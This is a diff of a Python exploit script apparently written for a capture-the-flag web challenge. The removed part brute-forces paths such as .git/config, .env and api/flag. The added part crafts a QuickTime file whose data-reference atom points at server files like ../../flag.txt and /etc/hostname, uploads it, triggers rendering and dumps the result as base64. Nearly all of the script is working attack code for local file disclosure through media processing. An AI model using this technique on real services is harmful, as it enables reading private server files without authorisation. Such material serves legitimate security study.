@@ -1,53 +1,72 @@
 #!/usr/bin/env python3
-import urllib.request, urllib.error, http.cookiejar, re, concurrent.futures
-BASE = "https://d7eef812-5707-splice-c7f97.mystery-challenges.webverselabs-pro.com"
-def do(path, method="GET", data=None, ct=None):
+import io, json, struct, base64, urllib.request, urllib.error, http.cookiejar
+
+BASE="https://d7eef812-5707-splice-c7f97.mystery-challenges.webverselabs-pro.com"
+def sess():
     cj=http.cookiejar.CookieJar()
-    op=urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
-    op.addheaders=[("User-Agent","Mozilla/5.0")]
-    r=urllib.request.Request(BASE+path, data=data, method=method)
-    if ct: r.add_header("Content-Type",ct)
+    o=urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj)); o.addheaders=[("User-Agent","Mozilla/5.0")]; return o
+def do(o,path,data=None,headers=None,method=None):
+    r=urllib.request.Request(BASE+path,data=data,method=method)
+    for k,v in (headers or {}).items(): r.add_header(k,v)
     try:
-        resp=op.open(r,timeout=25); return resp.status, resp.read()
-    except urllib.error.HTTPError as e: return e.code, e.read()
-    except Exception as e: return -1, str(e).encode()
+        resp=o.open(r,timeout=90); return resp.status,dict(resp.getheaders()),resp.read()
+    except urllib.error.HTTPError as e: return e.code,dict(e.headers),e.read()
+    except Exception as e: return -1,{},str(e).encode()
+def upload(o,fn,content):
+    bd="----x"; body=io.BytesIO()
+    body.write((f"--{bd}\r\nContent-Disposition: form-data; name=\"clip\"; filename=\"{fn}\"\r\nContent-Type: video/quicktime\r\n\r\n").encode())
+    body.write(content); body.write(f"\r\n--{bd}--\r\n".encode())
+    return do(o,"/studio/upload",data=body.getvalue(),headers={"Content-Type":f"multipart/form-data; boundary={bd}"},method="POST")
+def render(o,**kw):
+    st,h,b=do(o,"/api/render",data=json.dumps(kw).encode(),headers={"Content-Type":"application/json"},method="POST")
+    try: return json.loads(b)
+    except: return b.decode('utf-8','replace')
 
-APP404 = "could not find that page"
-def check(p):
-    st,b=do(p)
-    body=b.decode('utf-8','replace')
-    if st in (0,-1): return None
-    is404 = APP404 in body.lower()
-    if not is404 and st not in (400,):
-        return (p, st, len(b), re.sub(r"\s+"," ",body)[:90])
-    if st not in (404,) and not is404:
-        return (p, st, len(b), re.sub(r"\s+"," ",body)[:90])
-    return None
+def box(t,p): return struct.pack(">I",len(p)+8)+t+p
+def fbox(t,ver,flags,p): return box(t, bytes([ver])+flags.to_bytes(3,"big")+p)
+IDENT=struct.pack(">9i",0x10000,0,0,0,0x10000,0,0,0,0x40000000)
 
-words = """admin administrator login signin sign-in signup register logout account accounts user users
-profile me settings config configuration api v1 api/v1 internal debug dev test status health healthz
-metrics ping version info about-us dashboard console panel manage management studio/render studio/export
-studio/download studio/list studio/workspace studio/session studio/status render export download list
-media clips clip posters poster audiograms audiogram feed feeds rss podcast podcasts show shows episode
-episodes upload uploads files file download downloads job jobs queue task tasks worker workers analytics
-stats billing plans subscribe secret secrets flag flags key keys token tokens .git .git/config .gitignore
-.env .env.local env config.json app.json manifest.json package.json package-lock.json yarn.lock server
-index main routes lib src public/js public/app.js robots sitemap sitemap.xml humans.txt security.txt
-.well-known/security.txt api/render api/upload api/status api/health api/me api/user api/session api/config
-api/flag api/clips api/render/status api/export api/jobs api/media api/workspace api/studio backup backups
-db database dump sql data storage tmp temp cache logs log""".split()
+def make_mov(path, N=64, rate=8000):
+    mvhd=fbox(b"mvhd",0,0, struct.pack(">II",0,0)+struct.pack(">II",rate,N)+struct.pack(">I",0x10000)+struct.pack(">H",0x100)+b"\0"*10+IDENT+b"\0"*24+struct.pack(">I",2))
+    tkhd=fbox(b"tkhd",0,7, struct.pack(">II",0,0)+struct.pack(">I",1)+b"\0"*4+struct.pack(">I",N)+b"\0"*8+struct.pack(">HH",0,0)+struct.pack(">H",0x100)+b"\0\0"+IDENT+struct.pack(">II",0,0))
+    mdhd=fbox(b"mdhd",0,0, struct.pack(">II",0,0)+struct.pack(">II",rate,N)+struct.pack(">HH",0x55c4,0))
+    hdlr=fbox(b"hdlr",0,0, b"\0\0\0\0"+b"soun"+b"\0"*12+b"SoundHandler\0")
+    smhd=fbox(b"smhd",0,0, struct.pack(">HH",0,0))
+    loc=path.encode()+b"\0"
+    url =fbox(b"url ",0,0, loc)              # flags=0 -> external, location=path
+    dref=fbox(b"dref",0,0, struct.pack(">I",1)+url)
+    dinf=box(b"dinf",dref)
+    # AudioSampleEntry 'raw ' (u8 pcm)
+    ase=struct.pack(">6xH",1)+struct.pack(">HHI",0,0,0)+struct.pack(">HHHH",1,8,0,0)+struct.pack(">I",rate<<16)
+    stsd=fbox(b"stsd",0,0, struct.pack(">I",1)+box(b"raw ",ase))
+    stts=fbox(b"stts",0,0, struct.pack(">I",1)+struct.pack(">II",N,1))
+    stsc=fbox(b"stsc",0,0, struct.pack(">I",1)+struct.pack(">III",1,N,1))
+    stsz=fbox(b"stsz",0,0, struct.pack(">II",1,N))
+    stco=fbox(b"stco",0,0, struct.pack(">I",1)+struct.pack(">I",0))
+    stbl=box(b"stbl",stsd+stts+stsc+stsz+stco)
+    minf=box(b"minf",smhd+dinf+stbl)
+    mdia=box(b"mdia",mdhd+hdlr+minf)
+    trak=box(b"trak",tkhd+mdia)
+    moov=box(b"moov",mvhd+trak)
+    ftyp=box(b"ftyp",b"qt  "+struct.pack(">I",0x200)+b"qt  ")
+    return ftyp+moov
 
-print("Brute results (non-404):")
-found=[]
-with concurrent.futures.ThreadPoolExecutor(max_workers=12) as ex:
-    for r in ex.map(check, ["/"+w for w in words]):
-        if r: found.append(r); print(f"  {r[0]:34} {r[1]} len={r[2]} {r[3]!r}")
-print("total hits:", len(found))
-
-print("\nMethods on /api/render and /studio/upload:")
-for m in ["GET","PUT","DELETE","PATCH","OPTIONS","HEAD"]:
-    st,b=do("/api/render", method=m, data=(b"{}" if m in("PUT","PATCH") else None), ct="application/json")
-    print(f"  render {m:7} -> {st} {b[:80]!r}")
-    st,b=do("/studio/upload", method=m)
-    print(f"  upload {m:7} -> {st} {b[:60]!r}")
+for path in ["../../flag.txt","../../../../etc/hostname","/opt/app/flag.txt","/etc/hostname","../../server.js"]:
+    o=sess(); do(o,"/studio")
+    mov=make_mov(path, N=64)
+    st,h,b=upload(o,"clip.mov",mov)
+    j=render(o,slug="p",theme="midnight")
+    ok=j.get("ok") if isinstance(j,dict) else None
+    err=(j.get("errors") if isinstance(j,dict) else str(j)) or ""
+    print(f"\n######## dref path={path!r} upload={st} ok={ok}")
+    if err:
+        s=err.find("Input #0"); 
+        print(err[s: s+900] if s>=0 else err[-900:])
+    elif ok:
+        url=j["outputs"][0]["url"]
+        st,h,png=do(o,url)
+        print("POSTER bytes",len(png))
+        print(f"B64_{path.replace('/','_')}_START")
+        print(base64.b64encode(png).decode())
+        print(f"B64_{path.replace('/','_')}_END")
 print("\nDONE")
